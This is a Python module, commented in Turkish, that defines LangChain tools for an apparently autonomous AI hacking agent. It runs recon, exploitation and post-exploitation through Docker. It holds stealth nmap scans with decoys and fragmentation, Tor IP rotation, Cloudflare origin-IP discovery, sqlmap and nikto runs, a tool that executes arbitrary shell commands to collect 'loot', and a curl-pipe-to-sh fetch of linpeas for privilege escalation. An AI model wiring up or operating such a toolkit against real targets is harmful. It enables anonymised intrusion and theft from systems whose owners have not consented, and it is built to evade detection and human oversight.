import os
import subprocess
import logging
import time
import random
from typing import Optional, List
from langchain_core.tools import tool
from pydantic import BaseModel, Field

from core.docker_manager import get_docker_mgr
from core.output_parser import (
    parse_nmap, parse_whatweb, parse_nikto, 
    parse_nuclei, parse_sqlmap, truncate_output,
    parse_dir_fuzz, parse_waf_detect, parse_ssl_analysis,
    parse_wpscan, parse_subdomain_enum, parse_privesc_check,
    parse_loot
)
from core.recon_engine import CloudflareBypass, sanitize_domain
from core.vpn_manager import VPNManager

logger = logging.getLogger(__name__)

# =========================================================================
# HELPER: PROXY & EVASION WRAPPER
# =========================================================================

def wrap_proxy(command: str, mode: str = "http") -> str:
    """Komutları uygun proxy ile sarmalar."""
    if mode == "http":
        return f"export http_proxy=http://127.0.0.1:8118; export https_proxy=http://127.0.0.1:8118; {command}"
    return f"proxychains4 -q {command}"

# =========================================================================
# INPUT SCHEMAS
# =========================================================================

class NmapInput(BaseModel):
    target: str = Field(description="Taranacak IP veya Domain (https:// içermemeli).")

class StealthScanInput(BaseModel):
    target: str = Field(description="Taranacak IP veya Domain.")
    mode: str = Field(default="T1", description="Timing: T0-T5")

class IdleScanInput(BaseModel):
    target: str = Field(description="Hedef IP/Domain")
    zombie: str = Field(description="Zombie host IP'si")

class GenericURLInput(BaseModel):
    target_url: str = Field(description="Hedef tam URL (https:// ile)")

class GenericDomainInput(BaseModel):
    domain: str = Field(description="Hedef domain (Saf hali: robotistan.com)")

class SubdomainBruteInput(BaseModel):
    domain: str = Field(description="Brute-force domain")
    wordlist_type: str = Field(default="common", description="Wordlist")

class ASNReconInput(BaseModel):
    range_cidr: str = Field(description="Taranacak subnet (Örn: 1.2.3.0/24)")
    keyword: str = Field(description="Domain anahtar kelimesi")

class ShellExecInput(BaseModel):
    command: str = Field(description="Shell komutu.")
    target: str = Field(description="Hedef IP/Domain.")

class WriteKnowledgeInput(BaseModel):
    vector_id: str = Field(description="Vektör ID")
    status: str = Field(description="Durum")
    details: str = Field(description="Detaylar")
    next_approach: str = Field(default="", description="Adım")
    gain: str = Field(default="", description="Kazanım")

# =========================================================================
# AGENT 1 TOOLS (RECON & OSINT v2)
# =========================================================================

@tool("run_rotate_ip")
def run_rotate_ip() -> str:
    """Tor Proxy kimliğini (IP) otonom olarak değiştirir."""
    vpn = VPNManager()
    success = vpn.rotate_ip()
    return f"IP Rotasyonu: {'BAŞARILI' if success else 'HATA (nc missing or connection error)'}"

@tool("run_stealth_scan", args_schema=StealthScanInput)
def run_stealth_scan(target: str, mode: str = "T1") -> str:
    """Gizli port taraması yapar. URL protokollerini temizler."""
    clean_target = sanitize_domain(target)
    args = f"-Pn -sT -{mode} -f --data-length 24 --max-rate 5 -D RND:5 -g 53 --top-ports 100"
    command = wrap_proxy(f"nmap {args} '{clean_target}'", mode="socks")
    raw = get_docker_mgr().execute_command(command, timeout=1200)
    return parse_nmap(raw)

@tool("run_subdomain_bruteforce", args_schema=SubdomainBruteInput)
def run_subdomain_bruteforce(domain: str, wordlist_type: str = "common") -> str:
    """Aktif subdomain brute-force. Domain temizliği yapar."""
    clean_domain = sanitize_domain(domain)
    wl_path = "/usr/share/wordlists/dirb/common.txt"
    command = wrap_proxy(f"gobuster dns -d {clean_domain} -w {wl_path} -t 5 -z 50ms --quiet", mode="socks")
    raw = get_docker_mgr().execute_command(command, timeout=600)
    return parse_subdomain_enum(raw, clean_domain)

@tool("run_asn_recon", args_schema=ASNReconInput)
def run_asn_recon(range_cidr: str, keyword: str) -> str:
    """Subnet tarayıcı."""
    command = wrap_proxy(f"nmap -sL -n --dns-servers 8.8.8.8 {range_cidr} | grep -i '{keyword}'", mode="socks")
    raw = get_docker_mgr().execute_command(command, timeout=300)
    return f"--- BULGULAR ---\n{raw}" if raw.strip() else "İlişkili IP bulunamadı."

@tool("run_favicon_recon")
def run_favicon_recon(domain: str) -> str:
    """Favicon analizi."""
    recon = CloudflareBypass()
    f_hash = recon.get_favicon_hash(domain)
    return f"Favicon Hash: {f_hash}" if f_hash else "Analiz başarısız."

@tool("run_waf_detect", args_schema=GenericURLInput)
def run_waf_detect(target_url: str) -> str:
    """WAF tespiti. Tam URL gerektirir."""
    command = wrap_proxy(f"wafw00f '{target_url}' 2>/dev/null", mode="http")
    raw = get_docker_mgr().execute_command(command, timeout=60)
    return parse_waf_detect(raw)

@tool("run_origin_ip_finder", args_schema=GenericDomainInput)
def run_origin_ip_finder(domain: str) -> str:
    """ASN bazlı keşif motoru."""
    recon = CloudflareBypass()
    report = recon.find_origin_via_asn(domain)
    return f"ASN: {report['asn']}, Range: {report['range']}\nÖneri: 'run_asn_recon' ile tarama yapın."

@tool("run_whatweb", args_schema=GenericURLInput)
def run_whatweb(target_url: str) -> str:
    """Web teknolojilerini tespit eder."""
    command = wrap_proxy(f"whatweb -a 3 --color=never '{target_url}'", mode="http")
    raw = get_docker_mgr().execute_command(command, timeout=120)
    return parse_whatweb(raw)

@tool("run_subdomain_enum", args_schema=GenericDomainInput)
def run_subdomain_enum(domain: str) -> str:
    """Pasif subdomain keşfi."""
    clean_domain = sanitize_domain(domain)
    command = wrap_proxy(f"curl -s 'https://crt.sh/?q=%25.{clean_domain}&output=json' | jq -r '.[].name_value' | sort -u", mode="socks")
    raw = get_docker_mgr().execute_command(command, timeout=120)
    return parse_subdomain_enum(raw, clean_domain)

@tool("run_nmap_scan", args_schema=NmapInput)
def run_nmap_scan(target: str) -> str:
    """Standart port taraması."""
    clean_target = sanitize_domain(target)
    command = wrap_proxy(f"nmap -Pn -sT -p 1-1000 --open {clean_target}", mode="socks")
    raw = get_docker_mgr().execute_command(command, timeout=300)
    return parse_nmap(raw)

# =========================================================================
# BÖLÜM 2: EXPLOIT & POST-EXPLOIT (KORUNUYOR)
# =========================================================================

@tool("run_sqlmap", args_schema=GenericURLInput)
def run_sqlmap(target_url: str) -> str:
    command = wrap_proxy(f"sqlmap -u '{target_url}' --batch --random-agent --level=1", mode="http")
    raw = get_docker_mgr().execute_command(command, timeout=1200)
    return parse_sqlmap(raw)

@tool("run_nikto", args_schema=GenericURLInput)
def run_nikto(target_url: str) -> str:
    command = wrap_proxy(f"nikto -h '{target_url}' -Tuning 123489", mode="http")
    raw = get_docker_mgr().execute_command(command, timeout=900)
    return parse_nikto(raw)

@tool("run_loot_collector", args_schema=ShellExecInput)
def run_loot_collector(command: str, target: str) -> str:
    raw = get_docker_mgr().execute_command(wrap_proxy(command), timeout=300)
    return parse_loot(raw)

@tool("run_privesc_check", args_schema=GenericURLInput)
def run_privesc_check(target_url: str) -> str:
    command = wrap_proxy(f"curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", mode="http")
    raw = get_docker_mgr().execute_command(command, timeout=900)
    return parse_privesc_check(raw)

@tool("log_attack_result", args_schema=WriteKnowledgeInput)
def log_attack_result(vector_id: str, status: str, details: str, next_approach: str = "", gain: str = "") -> str:
    from core.db_manager import write_knowledge
    msg = f"{details}\n[NEXT]: {next_approach}"
    if gain: msg += f"\n[LOOT]: {gain}"
    write_knowledge(vector_id, status, msg)
    return f"SİSTEM: [{vector_id}] kaydedildi."

# Export listeleri
recon_tools = [run_rotate_ip, run_stealth_scan, run_subdomain_bruteforce, run_nmap_scan, run_asn_recon, run_favicon_recon, run_waf_detect, run_origin_ip_finder, run_whatweb, run_subdomain_enum]
exploit_tools = [run_sqlmap, run_nikto, log_attack_result]
post_exploit_tools = [run_privesc_check, run_loot_collector, log_attack_result]
